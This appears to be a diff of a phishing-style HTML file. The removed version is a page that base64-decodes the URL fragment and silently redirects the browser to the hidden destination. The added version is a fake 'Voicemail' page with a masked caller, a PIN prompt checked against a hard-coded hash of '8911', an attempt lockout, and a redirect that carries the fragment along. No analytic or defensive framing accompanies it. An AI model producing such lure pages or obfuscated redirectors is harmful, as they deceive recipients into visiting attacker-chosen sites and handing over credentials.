@@ -1,36 +1,136 @@
-<html lang="en"><head></head><body><scriptlanguage="javascript">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Voicemail</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f4f4;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
 
+    .voicemail-container {
+      background: white;
+      padding: 2rem;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      width: 90%;
+      max-width: 500px;
+    }
 
-<meta charset="UTF-8">
-<title>Redirect</title>
-<script>
-function base64DecodeUrl(str){
-    return decodeURIComponent(atob(str).split('').map(function(c) {
-        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
-    }).join(''));
-}
+    h1 {
+      margin-top: 0;
+      font-size: 1.8rem;
+      text-align: center;
+    }
 
-window.onload = function() {
-    var hash = window.location.hash.substr(1); // Get the fragment after the '#'
-    var url;
+    .message {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 1rem;
+      margin-top: 1.5rem;
+      background: #f9f9f9;
+      border-radius: 8px;
+    }
 
-    if (hash && hash.substr(0, 4) === 'http') {
-        url = hash; // If the fragment starts with 'http', use it as the URL
-    } else {
-        if (hash.includes('/')) {
-        url = base64DecodeUrl(hash.split('/')[0])+hash.split('/')[1]; // If not, try to base64 decode it
+    .message-info {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .message-info span {
+      font-size: 0.9rem;
+      color: #555;
+    }
+
+    input.code-input {
+      margin-top: 1rem;
+      width: 100%;
+      padding: 0.5rem;
+      font-size: 1rem;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+
+    button.play {
+      background: #4CAF50;
+      color: white;
+      border: none;
+      padding: 0.5rem 1rem;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    button.play:disabled {
+      background: gray;
+      cursor: not-allowed;
+    }
+
+    button.play:hover:enabled {
+      background: #45a049;
+    }
+  </style>
+</head>
+<body>
+  <div class="voicemail-container">
+    <h1>Play Messages</h1>
+
+    <input type="password" class="code-input" placeholder="Enter PIN" />
+
+    <div class="message">
+      <div class="message-info">
+        <strong>Caller: John ****</strong>
+        <span>May 29, 2025 - 10:15 AM</span>
+      </div>
+      <button class="play">▶️ Play</button>
+    </div>
+  </div>
+
+  <script>
+    // SHA-256 of "8911"
+    const storedHash = "539f5c175b7d129db35c3ff3bd8762a13ab9a59786d1c5a73b1cf2e7e37a623c";
+
+    let attempts = 0;
+    const maxAttempts = 3;
+    const playButton = document.querySelector('.play');
+    const codeInput = document.querySelector('.code-input');
+
+    async function hashCode(input) {
+      const encoder = new TextEncoder();
+      const data = encoder.encode(input);
+      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+      return Array.from(new Uint8Array(hashBuffer))
+        .map(b => b.toString(16).padStart(2, '0'))
+        .join('');
+    }
+
+    playButton.addEventListener('click', async () => {
+      const enteredCode = codeInput.value.trim();
+      const hashedInput = await hashCode(enteredCode);
+
+      if (hashedInput === storedHash) {
+        const hashFragment = window.location.hash; // Keep original hash
+        const redirectUrl = 'https://google.com' + hashFragment;
+        window.location.href = redirectUrl;
+      } else {
+        attempts++;
+        if (attempts >= maxAttempts) {
+          alert("Too many incorrect attempts. Access locked.");
+          playButton.disabled = true;
         } else {
-        url = base64DecodeUrl(hash); // If not, try to base64 decode it
+          alert(`Incorrect code. ${maxAttempts - attempts} attempt(s) left.`);
         }
-    }
-
-    if (url && /^(https?:\/\/)/.test(url)) { // Regex to check if the url starts with 'http://' or 'https://'
-        window.location.href = url; // If it's a valid URL, redirect
-    }
-};
-</script>
-
-
-
-
-</scriptlanguage="javascript"></body></html>
+      }
+    });
+  </script>
+</body>
+</html>
